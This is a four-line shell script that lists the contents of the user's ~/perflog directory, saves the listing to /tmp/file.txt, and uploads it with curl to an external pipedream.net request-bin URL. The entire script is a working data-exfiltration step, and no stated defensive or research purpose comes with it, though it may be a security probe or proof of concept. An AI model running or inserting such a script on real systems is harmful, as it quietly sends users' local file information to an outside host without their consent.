#!/bin/sh

echo $(ls -la ~/perflog) > /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
